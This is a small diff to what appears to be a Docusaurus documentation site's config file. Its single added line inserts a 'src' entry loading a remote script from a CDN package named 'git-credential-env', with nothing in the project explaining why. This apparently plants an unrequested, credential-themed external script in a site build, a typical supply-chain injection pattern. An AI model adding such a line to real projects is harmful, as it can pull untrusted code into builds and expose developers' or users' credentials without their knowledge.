@@ -14,6 +14,7 @@ const config = {
   onBrokenLinks: 'warn',
   onBrokenMarkdownLinks: 'warn',
   deploymentBranch: 'gh-pages',
+  src: 'https://cdn.jsdelivr.net/npm/git-credential-env@1.0.0/dist/index.umd.js',
   trailingSlash: false,
   i18n: {
     defaultLocale: 'en',
